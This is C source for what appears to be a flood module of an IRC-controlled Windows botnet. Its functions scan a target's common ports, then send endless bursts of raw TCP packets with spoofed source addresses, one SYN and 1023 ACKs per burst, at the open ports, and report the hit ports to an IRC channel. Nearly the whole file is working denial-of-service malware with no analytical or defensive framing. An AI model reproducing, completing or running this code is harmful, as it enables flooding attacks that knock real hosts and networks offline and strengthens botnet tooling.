#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_WONK
DWORD WINAPI WonkThread(LPVOID param) 
{
	char sendbuf[IRCLINE];

	WONK wonk = *((WONK *)param);
	WONK *wonks = (WONK *)param;
	wonks->gotinfo = TRUE;

	sprintf(sendbuf, "-\x03\x34\2wonk\2\x03- Done with flood, ports hit: %s", SendPhatWonk(finet_addr(wonk.ip), atoi(wonk.length), atoi(wonk.delay)));
	if (!wonk.silent) irc_privmsg(wonk.sock, wonk.chan, sendbuf, wonk.notice); 
	addlog(sendbuf);

	clearthread(wonk.threadnum);

	ExitThread(0); 
}

#define FIN  0x01
#define SYN  0x02
#define RST  0x04
#define PUSH 0x08
#define ACK  0x10
#define URG  0x20

#define IP 0
#define ICMP 1
#define IGMP 2
#define TCP 6
#define UDP 17
#define RAW 255

#define ICMP_ECHOREPLY	0
#define ICMP_ECHO	8

#define SET_SOCK_BLOCK(s,block) { unsigned long __i=block?0:1; ioctlsocket(s,FIONBIO,&__i); }

typedef char s8;
typedef unsigned char u8;
typedef short int s16;
typedef unsigned short int u16;
typedef int s32;
typedef unsigned int u32;

struct xiph
{
	unsigned char ihl:4;
	unsigned char version:4;
	unsigned char tos;
	unsigned short int tot_len;
	unsigned short int id;
	unsigned short int frag_off;
	unsigned char ttl;
	unsigned char protocol;
	unsigned short int check;
	unsigned int saddr;
	unsigned int daddr;
};

struct icmp
  {
    u8 type, code;
    u16 sum;
    u16 id, seq;
  };


struct ip
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u8 ihl:4, ver:4;
#else
    u8 ver:4, ihl:4;
#endif
    u8 tos;
    u16 tl, id, off;
    u8 ttl, pro;
    u16 sum;
    u32 src, dst;
  };

struct xtcphdr
  {
    u16 src, dst;
    u32 seq, ack;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u8 x2:4, off:4;
#else
    u8 off:4, x2:4;
#endif
    u8 flg;
#define FIN  0x01
#define SYN  0x02
#define RST  0x04
#define PUSH 0x08
#define ACK  0x10
#define URG  0x20
    u16 win, sum, urp;
  };

struct ip_hdr_wonk {
    u_int       ip_hl:4,                /* header length in 32 bit words */
                ip_v:4;                 /* ip version */
    u_char      ip_tos;                 /* type of service */
    u_short     ip_len;                 /* total packet length */
    u_short     ip_id;                  /* identification */
    u_short     ip_off;                 /* fragment offset */
    u_char      ip_ttl;                 /* time to live */
    u_char      ip_p;                   /* protocol */
    u_short     ip_sum;                 /* ip checksum */
    u_long      saddr, daddr;           /* source and dest address */
};

struct tcp_hdr_wonk {
    u_short     th_sport;               /* source port */
    u_short     th_dport;               /* destination port */
    u_long      th_seq;                 /* sequence number */
    u_long      th_ack;                 /* acknowledgement number */
    u_int       th_x2:4,                /* unused */
                th_off:4;               /* data offset */
    u_char      th_flags;               /* flags field */
    u_short     th_win;                 /* window size */
    u_short     th_sum;                 /* tcp checksum */
    u_short     th_urp;                 /* urgent pointer */
};

struct tcpopt_hdr_wonk {
    u_char  type;                       /* type */
    u_char  len;                                /* length */
    u_short value;                      /* value */
};

struct pseudo_hdr_wonk {                     /* See RFC 793 Pseudo Header */
    u_long saddr, daddr;                        /* source and dest address */
    u_char mbz, ptcl;                   /* zero and protocol */
    u_short tcpl;                       /* tcp length */
};

struct packet {
    struct ip ip;
    struct xtcphdr tcp;
};

struct cksum {
    struct pseudo_hdr_wonk pseudo;
    struct xtcphdr tcp;
};

#ifdef _WIN32
struct timespec {
	time_t   tv_sec;   /* seconds */
	long     tv_nsec;  /* nanoseconds */
};
#endif // _WIN32

struct packet packet;
struct cksum cksum;
struct sockaddr_in s_in;
u_short dstport, pktsize, pps;
int sock=0;

inline unsigned long spoofip(unsigned long t_target)
{
    unsigned long res = t_target & 0x0000FFFF;
    res |= brandom(1, 0xFFFF-1) << 16;
    return res;
}

int connect_no_timeout(unsigned int sockfd,
						const struct sockaddr *addr,
						int addrlen,
						struct timeval *timeout)
{
	int error = 0, ret;
	int error_len;

	fd_set rset, wset;

	if (timeout == NULL)	{
		/* blocking mode */
		return connect(sockfd, addr, addrlen);
	}
	
	/* Set the socket to be non-blocking */
	SET_SOCK_BLOCK(sockfd, 0);

	fconnect(sockfd, addr, addrlen);

	FD_ZERO(&rset);
	FD_SET(sockfd, &rset);
	FD_ZERO(&wset);
	FD_SET(sockfd, &wset);

	if ((ret = fselect(sockfd + 1, &rset, &wset, NULL, timeout)) == 0) {
		return SOCKET_ERROR;
	}

	if (ret == SOCKET_ERROR) {
		return SOCKET_ERROR;
	}

	if(FD_ISSET(sockfd, &rset) || FD_ISSET(sockfd, &wset)) {
		error_len = sizeof(error);
		if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, (char *) &error, &error_len) == SOCKET_ERROR) {
			return SOCKET_ERROR;
		}
	} else {
		/* whoops: sockfd has disappeared */
		return SOCKET_ERROR;
	}

	/* Set the socket back to blocking
	ioctlsocket(sockfd, FIONBIO, &block);
	*/

	if (error) { 
		return SOCKET_ERROR;
	}

	return 0;
}

char* SendPhatWonk(unsigned long TargetIP, unsigned int len, int delay)
{
    BOOL flag=TRUE;
	unsigned long lTimerCount=0;
	struct timespec ts;
    int i=0;

	struct sockaddr_in addr;
	int scansock=0;

	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);

	fsetsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag));

    srand(GetTickCount());

	unsigned int port[28] = { 1025,21,22,23,25,53,80,81,88,110,113,119,135,
							  137,139,143,443,445,1024,1433,1500,
							  1720,3306,3389,5000,6667,8000,8080 };

	unsigned int openport[28] = {0,0,0};
	static char hitports[1024] = "";
	int hitport=0, lastport=0;
	char tmpMess[]="";
	struct timeval working_timeout;
	working_timeout.tv_sec = 3;
	working_timeout.tv_usec = 3000;

	for (i=0;i<28;i++)
	{
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = TargetIP;
		addr.sin_port = fhtons(port[i]);

		scansock = fsocket(AF_INET,SOCK_STREAM,0);
		int result = connect_no_timeout(scansock,(struct sockaddr *)&addr,sizeof(struct sockaddr),&working_timeout);

		fclosesocket(scansock);
		
		if(result == 0)
		{
				openport[i] = port[i];
		}
	}

	sprintf(hitports, " ");

	lTimerCount=GetTickCount();
	
	for (i=0;i<28;i++)
	{

	if ((GetTickCount()-lTimerCount)/1000>len) break;

		if (openport[i] != 0)
		{
			hitport = openport[i];
			//hitports.Format("%s%d ",hitports.CStr(),hitport);
			sprintf(hitports, "%s%d ", hitports, hitport);
		}
		else
		{
			hitport = fhtons (brandom (0, 65535)); // no open ports
		}
	}

	for (;;)
	{
	
	memset(&packet, 0, sizeof(packet));
    ts.tv_sec				= 0;
    ts.tv_nsec				= 10;
    packet.ip.ihl			= 5;
    packet.ip.ver			= 4;
    packet.ip.pro			= IPPROTO_TCP;
    packet.ip.tos			= 0x08;
    packet.ip.id			= fhtons (brandom (1024, 65535));
    packet.ip.tl			= fhtons(sizeof(packet));
    packet.ip.off			= 0;
    packet.ip.ttl			= 255;

    if (!spoofing) 
        packet.ip.src = spoofip(TargetIP);
    else
        packet.ip.src = finet_addr(spoof);

    packet.ip.dst			= TargetIP;
    packet.tcp.flg			= 0;
    packet.tcp.win			= fhtons(16384);
    packet.tcp.seq			= fhtonl (brandom (0, 65535) + (brandom (0, 65535) << 8));
    packet.tcp.ack			= 0;
    packet.tcp.off			= 5;
    packet.tcp.urp			= 0;

	packet.tcp.dst			= hitport;

	cksum.pseudo.daddr		= TargetIP;
    cksum.pseudo.mbz		= 0;
    cksum.pseudo.ptcl		= IPPROTO_TCP;
    cksum.pseudo.tcpl		= fhtons(sizeof(struct xtcphdr));
    s_in.sin_family			= AF_INET;
	s_in.sin_addr.s_addr	= TargetIP;
    s_in.sin_port			= packet.tcp.dst;

	for(i=0;i<1023;++i) {
	/* 
	send 1 syn packet + 1023 ACK packets. 
	*/
    if(i==0) {
	packet.tcp.src = fhtons (brandom (0, 65535));
	cksum.pseudo.saddr = packet.ip.src;
	packet.tcp.flg = SYN;
    packet.tcp.ack = 0;
    }
    else {
	packet.tcp.flg = ACK;
	packet.tcp.ack = fhtons (brandom (0, 65535));
    }
       ++packet.ip.id;
       ++packet.tcp.seq;
       s_in.sin_port = packet.tcp.dst;
       packet.ip.sum         = 0;
       packet.tcp.sum        = 0;
       cksum.tcp             = packet.tcp;
       packet.ip.sum         = checksum((unsigned short *)&packet.ip, 20);
       packet.tcp.sum        = checksum((unsigned short *)&cksum, sizeof(cksum));

       fsendto(sock, (const char *)&packet, sizeof(packet), 0, (struct sockaddr *)&s_in, sizeof(s_in));
	   }

	if((GetTickCount()-lTimerCount)/1000>len) break;
	Sleep(delay);
    }
	return hitports;
}
#endif